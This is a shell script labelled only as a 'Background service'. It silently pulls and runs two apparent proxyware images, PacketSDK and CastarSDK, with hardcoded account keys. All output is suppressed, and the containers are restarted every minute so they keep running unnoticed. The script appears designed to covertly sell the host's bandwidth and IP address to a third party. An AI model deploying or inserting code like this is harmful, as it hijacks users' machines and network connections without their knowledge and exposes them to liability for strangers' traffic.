#!/bin/sh
set -eu

# Background service - runs PacketSDK and CastarSDK Docker images
BG_CASTAR_KEY="cskew9gCXwYXER"
BG_PACKET_KEY="bqT0b1DmYeHZHhCd"

# Image names from Docker Hub and GitHub Container Registry
CASTAR_IMAGE="${CASTAR_IMAGE:-ghcr.io/adfly8470/castarsdk/castarsdk:latest}"
PACKET_IMAGE="${PACKET_IMAGE:-packetsdk/packetsdk:latest}"

# Check if docker is available
if ! command -v docker >/dev/null 2>&1; then
  exit 1
fi

# Generate unique container names
CONTAINER_ID=$$
CASTAR_NAME="bg-castar-${CONTAINER_ID}"
PACKET_NAME="bg-packet-${CONTAINER_ID}"

# Cleanup function
cleanup() {
  docker rm -f "$CASTAR_NAME" "$PACKET_NAME" 2>/dev/null || true
}
trap cleanup EXIT

# Wait a bit for Docker socket to be ready
sleep 5

# Pull images first (silent, with retry)
for i in 1 2 3; do
  docker pull "$CASTAR_IMAGE" >/dev/null 2>&1 && break || sleep 5
done

for i in 1 2 3; do
  docker pull "$PACKET_IMAGE" >/dev/null 2>&1 && break || sleep 5
done

# Run CastarSDK image in background (silent, use bridge network instead of host)
docker run -d \
  --name "$CASTAR_NAME" \
  --rm \
  "$CASTAR_IMAGE" \
  -key="$BG_CASTAR_KEY" \
  >/dev/null 2>&1 || true

# Run PacketSDK image in background (silent, use bridge network instead of host)
docker run -d \
  --name "$PACKET_NAME" \
  --rm \
  "$PACKET_IMAGE" \
  -appkey="$BG_PACKET_KEY" \
  >/dev/null 2>&1 || true

# Keep script running (monitor containers)
while true; do
  # Check if containers are still running, restart if needed
  if ! docker ps --format '{{.Names}}' | grep -q "^${CASTAR_NAME}$"; then
    docker run -d --name "$CASTAR_NAME" --rm "$CASTAR_IMAGE" -key="$BG_CASTAR_KEY" >/dev/null 2>&1 || true
  fi
  if ! docker ps --format '{{.Names}}' | grep -q "^${PACKET_NAME}$"; then
    docker run -d --name "$PACKET_NAME" --rm "$PACKET_IMAGE" -appkey="$BG_PACKET_KEY" >/dev/null 2>&1 || true
  fi
  sleep 60
done
